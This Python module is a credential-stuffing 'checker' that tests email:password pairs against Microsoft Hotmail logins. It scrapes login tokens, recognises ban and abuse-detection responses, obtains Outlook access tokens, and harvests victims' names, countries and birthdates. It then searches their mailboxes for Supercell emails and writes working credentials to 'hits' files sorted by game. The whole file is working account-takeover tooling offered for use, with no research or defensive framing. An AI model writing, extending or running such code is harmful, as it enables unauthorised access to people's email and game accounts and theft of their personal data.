"""
Supercell Engine - Modular Supercell Account Checker
Handles authentication, account verification, and game detection
"""

import requests
import json
import uuid
import urllib.parse
import datetime
import re
import os
import threading
from typing import Dict, List, Tuple, Optional, Any

# Static user agent for API calls
DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

# Threading lock for thread-safe operations
engine_lock = threading.Lock()


class SupercellStats:
    """Thread-safe statistics collector for Supercell engine"""
    
    def __init__(self):
        self.total_checked = 0
        self.total_hits = 0
        self.supercell_hits = 0
        self.valid_accounts = 0
        self.bad_accounts = 0
        self.errors = 0
        self.game_breakdown = {
            'clash_royale': 0,
            'brawl_stars': 0,
            'clash_of_clans': 0,
            'hay_day': 0
        }
        self.lock = threading.Lock()
    
    def increment_checked(self):
        """Increment total checked count"""
        with self.lock:
            self.total_checked += 1
    
    def increment_hit(self):
        """Increment total hits"""
        with self.lock:
            self.total_hits += 1
    
    def increment_supercell(self):
        """Increment Supercell-specific hits"""
        with self.lock:
            self.supercell_hits += 1
    
    def increment_valid(self):
        """Increment valid accounts (without Supercell)"""
        with self.lock:
            self.valid_accounts += 1
    
    def increment_bad(self):
        """Increment bad/failed accounts"""
        with self.lock:
            self.bad_accounts += 1
    
    def increment_error(self):
        """Increment error count"""
        with self.lock:
            self.errors += 1
    
    def add_game(self, game_name: str):
        """Track which game was found"""
        with self.lock:
            if game_name in self.game_breakdown:
                self.game_breakdown[game_name] += 1
    
    def get_stats(self) -> Dict[str, Any]:
        """Get current statistics snapshot"""
        with self.lock:
            return {
                'total_checked': self.total_checked,
                'total_hits': self.total_hits,
                'supercell_hits': self.supercell_hits,
                'valid_accounts': self.valid_accounts,
                'bad_accounts': self.bad_accounts,
                'errors': self.errors,
                'games': self.game_breakdown.copy()
            }


class HotmailAuthenticator:
    """Handles Microsoft Hotmail authentication flow"""
    
    @staticmethod
    def get_tokens(email: str) -> Optional[Dict[str, Any]]:
        """Get initial authentication tokens"""
        max_retries = 2
        for attempt in range(max_retries):
            try:
                headers = {
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": DEFAULT_USER_AGENT,
                    "return-client-request-id": "false",
                    "client-request-id": str(uuid.uuid4()),
                    "x-ms-sso-ignore-sso": "1",
                    "correlation-id": str(uuid.uuid4()),
                    "x-client-ver": "1.1.0+9e54a0d1",
                    "x-client-os": "28",
                    "x-client-sku": "MSAL.xplat.android",
                    "x-client-src-sku": "MSAL.xplat.android",
                    "X-Requested-With": "com.microsoft.outlooklite",
                }
                
                params = {
                    "client_info": "1",
                    "haschrome": "1",
                    "login_hint": email,
                    "mkt": "en",
                    "response_type": "code",
                    "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                    "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
                    "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D"
                }
                
                url = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?{urllib.parse.urlencode(params)}"
                res = requests.get(url, headers=headers, timeout=10)
                cok = res.cookies.get_dict()
                
                try:
                    host = res.text.split('"urlPost":"')[1].split('",')[0]
                    ppft = res.text.split('name=\\"PPFT\\" id=\\"i0327\\" value=\\"')[1].split('\\"')[0]
                    ad_url = res.url.split('haschrome=1')[0] if 'haschrome=1' in res.url else res.url
                    
                    return {
                        'host': host,
                        'ppft': ppft,
                        'ad_url': ad_url,
                        'cookies': cok,
                        'response_text': res.text,
                        'response_url': res.url
                    }
                except IndexError:
                    continue
                    
            except Exception:
                if attempt == max_retries - 1:
                    return None
                continue
        
        return None
    
    @staticmethod
    def login(email: str, password: str, tokens: Dict[str, Any]) -> Dict[str, Any]:
        """Perform Microsoft account login"""
        if not tokens:
            return {"status": "error", "message": "No tokens"}
        
        cok = tokens['cookies']
        cookie_parts = []
        
        if cok.get('MSPRequ'):
            cookie_parts.append(f"MSPRequ={cok['MSPRequ']}")
        if cok.get('uaid'):
            cookie_parts.append(f"uaid={cok['uaid']}")
        if cok.get('RefreshTokenSso'):
            cookie_parts.append(f"RefreshTokenSso={cok['RefreshTokenSso']}")
        if cok.get('MSPOK'):
            cookie_parts.append(f"MSPOK={cok['MSPOK']}")
        if cok.get('OParams'):
            cookie_parts.append(f"OParams={cok['OParams']}")
        
        cookie_str = "; ".join(cookie_parts)
        
        payload = {
            "i13": "1",
            "login": email,
            "loginfmt": email,
            "type": "11",
            "LoginOptions": "1",
            "lrt": "",
            "lrtPartition": "",
            "hisRegion": "",
            "hisScaleUnit": "",
            "passwd": password,
            "ps": "2",
            "psRNGCDefaultType": "",
            "psRNGCEntropy": "",
            "psRNGCSLK": "",
            "canary": "",
            "ctx": "",
            "hpgrequestid": "",
            "PPFT": tokens['ppft'],
            "PPSX": "PassportR",
            "NewUser": "1",
            "FoundMSAs": "",
            "fspost": "0",
            "i21": "0",
            "CookieDisclosure": "0",
            "IsFidoSupported": "0",
            "isSignupPost": "0",
            "isRecoveryAttemptPost": "0",
            "i19": "9960"
        }
        
        headers = {
            "Host": "login.live.com",
            "Connection": "keep-alive",
            "Content-Length": str(len(urllib.parse.urlencode(payload))),
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Origin": "https://login.live.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": DEFAULT_USER_AGENT,
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": f"{tokens['ad_url']}haschrome=1",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
            "Cookie": f"{cookie_str}; MicrosoftApplicationsTelemetryDeviceId={str(uuid.uuid4())}"
        }
        
        try:
            response = requests.post(tokens['host'], data=payload, headers=headers, 
                                    allow_redirects=False, timeout=10)
            login_cookies = response.cookies.get_dict()
            response_text = response.text
            location = response.headers.get('Location', '')
            
            if "JSH" in login_cookies and "JSHP" in login_cookies and "ANON" in login_cookies and "WLSSC" in login_cookies:
                code = None
                if location and 'code=' in location:
                    code = location.split('code=')[1].split('&')[0]
                
                cid = login_cookies.get('MSPCID', cok.get('MSPCID', ''))
                
                return {
                    "status": "success",
                    "code": code,
                    "cid": cid.upper() if cid else "UNKNOWN",
                    "cookies": login_cookies,
                    "location": location,
                }
            
            html_lower = response_text.lower()
            
            if "account or password is incorrect" in html_lower:
                return {"status": "failure", "message": "Wrong password"}
            elif "too many times with" in html_lower:
                return {"status": "ban", "message": "Too many attempts"}
            elif "https://account.live.com/identity/confirm" in html_lower or "action=\"https://account.live.com/consent/update" in html_lower:
                return {"status": "failure", "message": "Identity confirmation required"}
            elif "https://account.live.com/recover" in html_lower:
                return {"status": "failure", "message": "Account recovery required"}
            elif "https://account.live.com/abuse" in html_lower or "https://login.live.com/finisherror.srf" in location.lower():
                return {"status": "failure", "message": "Abuse detection"}
            
            return {"status": "failure", "message": "Login failed"}
            
        except Exception as e:
            return {"status": "error", "message": str(e)}
    
    @staticmethod
    def get_access_token(code: str, retry_count: int = 3) -> Optional[str]:
        """Exchange authorization code for access token with better error handling"""
        if not code:
            return None
        
        for attempt in range(retry_count):
            try:
                token_data = {
                    "client_info": "1",
                    "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                    "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                    "grant_type": "authorization_code",
                    "code": code,
                    "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
                }
                
                headers = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)"
                }
                
                response = requests.post(
                    "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                    data=token_data,
                    headers=headers,
                    timeout=20
                )
                
                if response.status_code == 200:
                    try:
                        token_json = response.json()
                        access_token = token_json.get("access_token")
                        if access_token:
                            return access_token
                    except:
                        pass
                
                if attempt < retry_count - 1:
                    continue
                    
            except Exception:
                if attempt < retry_count - 1:
                    continue
        
        return None


class SupercellScanner:
    """Detects Supercell games linked to accounts"""
    
    @staticmethod
    def extract_message_count_and_last_date(search_text: str) -> Tuple[int, str]:
        """Extract total message count and last message date from search response"""
        total_messages = 0
        last_message_date = "Not Found"
        
        try:
            if not search_text:
                return total_messages, last_message_date
            
            # Extract total message count using regex
            message_count_patterns = [
                r'"Total"\s*:\s*(\d+)',
                r'"MessageCount"\s*:\s*(\d+)',
                r'"Messages"\s*:\s*(\d+)',
                r'"ItemCount"\s*:\s*(\d+)',
                r'(\d+)\s+message',
            ]
            
            all_message_counts = []
            for pattern in message_count_patterns:
                matches = re.findall(pattern, search_text, re.IGNORECASE)
                for match in matches:
                    try:
                        count = int(match)
                        if count > 0:
                            all_message_counts.append(count)
                    except ValueError:
                        continue
            
            if all_message_counts:
                total_messages = sum(all_message_counts)
            
            # Extract last message date
            date_patterns = [
                r'\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:\.\d+)?Z?',
                r'\d{4}-\d{2}-\d{2}',
                r'"LastDeliveryTime"\s*:\s*"([^"]+)"',
                r'"ReceivedTime"\s*:\s*"([^"]+)"',
            ]
            
            all_dates = []
            for pattern in date_patterns:
                matches = re.findall(pattern, search_text)
                all_dates.extend(matches)
            
            if all_dates:
                # Use most recent date found
                last_message_date = all_dates[0].split('T')[0] if 'T' in str(all_dates[0]) else str(all_dates[0])
        
        except Exception:
            pass
        
        return total_messages, last_message_date
    
    @staticmethod
    def get_extended_profile_info(access_token: str, cid: str) -> Dict[str, Any]:
        """Retrieve extended profile information"""
        profile_info = {
            "country": "Unknown",
            "name": "Unknown",
            "birthdate": "Unknown",
            "last_message": "Not Found"
        }
        
        try:
            headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "ForceSync": "false",
                "Authorization": f"Bearer {access_token}",
                "X-AnchorMailbox": f"CID:{cid}",
                "Host": "substrate.office.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            
            profile_url = "https://substrate.office.com/profileb2/v2.0/me/V1Profile"
            response = requests.get(profile_url, headers=headers, timeout=10)
            
            if response.status_code == 200:
                try:
                    profile_data = response.json()
                    
                    # Extract country
                    if 'location' in profile_data:
                        profile_info["country"] = profile_data.get("location", "Unknown")
                    elif 'country' in profile_data:
                        profile_info["country"] = profile_data.get("country", "Unknown")
                    
                    # Extract name
                    if 'displayName' in profile_data:
                        profile_info["name"] = profile_data.get("displayName", "Unknown")
                    
                    # Extract birthdate
                    birth_day = str(profile_data.get('birthDay', '')).strip()
                    birth_month = str(profile_data.get('birthMonth', '')).strip()
                    birth_year = str(profile_data.get('birthYear', '')).strip()
                    
                    if birth_day and birth_month and birth_year:
                        if len(birth_day) == 1:
                            birth_day = f"0{birth_day}"
                        if len(birth_month) == 1:
                            birth_month = f"0{birth_month}"
                        profile_info["birthdate"] = f"{birth_day}-{birth_month}-{birth_year}"
                    
                except json.JSONDecodeError:
                    pass
        
        except Exception:
            pass
        
        return profile_info
    
    @staticmethod
    def search_supercell_emails(access_token: str, cid: str, email: str, retry_count: int = 2) -> Dict[str, Any]:
        """Search for Supercell emails with multiple fallback methods"""
        supercell_senders = [
            "noreply@id.supercell.com",
            "no-reply@supercell.com",
            "message@supercell.com",
            "noreply@supercell.com",
            "support@supercell.com"
        ]
        
        if not access_token:
            return {
                "search_text": "",
                "total_messages": 0,
                "last_message_date": "Not Found",
                "has_supercell": False
            }
        
        found_supercell = False
        total_messages = 0
        last_message_date = "Not Found"
        
        for supercell_email in supercell_senders:
            for attempt in range(retry_count):
                try:
                    search_payload = {
                        "Cvid": str(uuid.uuid4()),
                        "Scenario": {"Name": "owa.react"},
                        "TimeZone": "Pacific Standard Time",
                        "TextDecorations": "Off",
                        "EntityRequests": [{
                            "EntityType": "Conversation",
                            "ContentSources": ["Exchange"],
                            "Filter": {
                                "Or": [
                                    {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                                    {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                                ]
                            },
                            "From": 0,
                            "Query": {"QueryString": f"from:{supercell_email}"},
                            "Size": 50,
                            "Sort": [
                                {"Field": "Time", "SortDirection": "Desc"}
                            ],
                            "EnableTopResults": True,
                            "TopResultsCount": 1
                        }],
                    }
                    
                    search_headers = {
                        "User-Agent": "Outlook-Android/2.0",
                        "Accept": "application/json",
                        "Authorization": f"Bearer {access_token}",
                        "X-AnchorMailbox": f"CID:{cid}",
                        "Host": "substrate.office.com",
                        "Connection": "Keep-Alive",
                        "Accept-Encoding": "gzip",
                        "Content-Type": "application/json"
                    }
                    
                    response = requests.post(
                        "https://outlook.live.com/searchservice/api/v2/query",
                        json=search_payload,
                        headers=search_headers,
                        timeout=20
                    )
                    
                    if response.status_code == 200:
                        response_text = response.text
                        
                        if '"TotalCount":1' in response_text or '"itemId"' in response_text:
                            found_supercell = True
                            msg_count, msg_date = SupercellScanner.extract_message_count_and_last_date(response_text)
                            if msg_count > 0:
                                total_messages += msg_count
                            if msg_date != "Not Found":
                                last_message_date = msg_date
                        
                        break
                        
                except Exception:
                    if attempt < retry_count - 1:
                        continue
        
        return {
            "search_text": "supercell" if found_supercell else "",
            "total_messages": total_messages,
            "last_message_date": last_message_date,
            "has_supercell": found_supercell
        }
    
    @staticmethod
    def analyze_games(search_data: Dict[str, Any]) -> Dict[str, Any]:
        """Analyze if account has Supercell games based on email presence"""
        results = {
            "clash_royale": False,
            "brawl_stars": False,
            "clash_of_clans": False,
            "hay_day": False,
            "has_supercell": search_data.get("has_supercell", False)
        }
        
        if search_data.get("has_supercell") and search_data.get("total_messages", 0) > 0:
            results["has_supercell"] = True
        
        return results


class SupercellEngine:
    """Main Supercell checking engine"""
    
    def __init__(self, results_dir: str = "Supercell_Results"):
        self.results_dir = results_dir
        self.stats = SupercellStats()
        
        # Ensure results directory exists
        if not os.path.exists(results_dir):
            os.makedirs(results_dir)
    
    def check_account(self, email: str, password: str) -> Optional[Dict[str, Any]]:
        """Check a single account for Supercell games with robust error handling"""
        self.stats.increment_checked()
        
        try:
            tokens = HotmailAuthenticator.get_tokens(email)
            if not tokens:
                self.stats.increment_error()
                return None
            
            login_result = HotmailAuthenticator.login(email, password, tokens)
            
            if login_result["status"] != "success":
                if login_result["status"] == "failure":
                    self.stats.increment_bad()
                else:
                    self.stats.increment_error()
                return None
            
            self.stats.increment_hit()
            self.stats.increment_valid()
            
            code = login_result.get("code")
            access_token = HotmailAuthenticator.get_access_token(code) if code else None
            cid = login_result.get("cid", "UNKNOWN")
            
            result = {
                "email": email,
                "password": password,
                "country": "Unknown",
                "name": "Unknown",
                "birthdate": "Unknown",
                "total_messages": 0,
                "clash_royale": False,
                "brawl_stars": False,
                "clash_of_clans": False,
                "hay_day": False,
                "last_message": "Not Found",
                "has_supercell": False,
                "status": "valid"
            }
            
            if access_token:
                try:
                    profile_info = SupercellScanner.get_extended_profile_info(access_token, cid)
                    result.update(profile_info)
                    
                    search_data = SupercellScanner.search_supercell_emails(access_token, cid, email)
                    result["total_messages"] = search_data.get("total_messages", 0)
                    result["last_message"] = search_data.get("last_message_date", "Not Found")
                    
                    games = SupercellScanner.analyze_games(search_data)
                    result.update(games)
                    
                    if games["has_supercell"]:
                        self.stats.increment_supercell()
                        result["status"] = "supercell"
                        self.save_result(result)
                    else:
                        result["status"] = "valid_no_games"
                        self.save_valid_result(result)
                
                except Exception:
                    self.save_valid_result(result)
            else:
                self.save_valid_result(result)
            
            return result
        
        except Exception:
            self.stats.increment_error()
            return None
    
    def save_result(self, result: Dict[str, Any]):
        """Save Supercell hit result"""
        try:
            games = []
            if result.get('clash_royale'):
                games.append("Clash Royale")
            if result.get('brawl_stars'):
                games.append("Brawl Stars")
            if result.get('clash_of_clans'):
                games.append("Clash of Clans")
            if result.get('hay_day'):
                games.append("Hay Day")
            
            games_str = " | ".join(games) if games else "No games"
            
            output_line = (
                f"{result['email']}:{result['password']} | "
                f"Country={result['country']} | "
                f"Name={result['name']} | "
                f"Birthdate={result['birthdate']} | "
                f"Messages={result['total_messages']} | "
                f"Games={games_str} | "
                f"LastMsg={result['last_message']}"
            )
            
            # Save to main results file
            hits_file = os.path.join(self.results_dir, "Supercell_Hits.txt")
            with open(hits_file, "a", encoding="utf-8") as f:
                f.write(output_line + "\n")
            
            # Save to individual game files
            if result.get('clash_royale'):
                game_file = os.path.join(self.results_dir, "Clash_Royale.txt")
                with open(game_file, "a", encoding="utf-8") as f:
                    f.write(f"{result['email']}:{result['password']}\n")
            
            if result.get('brawl_stars'):
                game_file = os.path.join(self.results_dir, "Brawl_Stars.txt")
                with open(game_file, "a", encoding="utf-8") as f:
                    f.write(f"{result['email']}:{result['password']}\n")
            
            if result.get('clash_of_clans'):
                game_file = os.path.join(self.results_dir, "Clash_of_Clans.txt")
                with open(game_file, "a", encoding="utf-8") as f:
                    f.write(f"{result['email']}:{result['password']}\n")
            
            if result.get('hay_day'):
                game_file = os.path.join(self.results_dir, "Hay_Day.txt")
                with open(game_file, "a", encoding="utf-8") as f:
                    f.write(f"{result['email']}:{result['password']}\n")
        
        except Exception:
            pass
    
    def save_valid_result(self, result: Dict[str, Any]):
        """Save valid account without Supercell games"""
        try:
            output_line = f"{result['email']}:{result['password']}"
            hits_file = os.path.join(self.results_dir, "Valid_Accounts.txt")
            with open(hits_file, "a", encoding="utf-8") as f:
                f.write(output_line + "\n")
        except Exception:
            pass
    
    def get_stats(self) -> Dict[str, Any]:
        """Get current statistics"""
        return self.stats.get_stats()
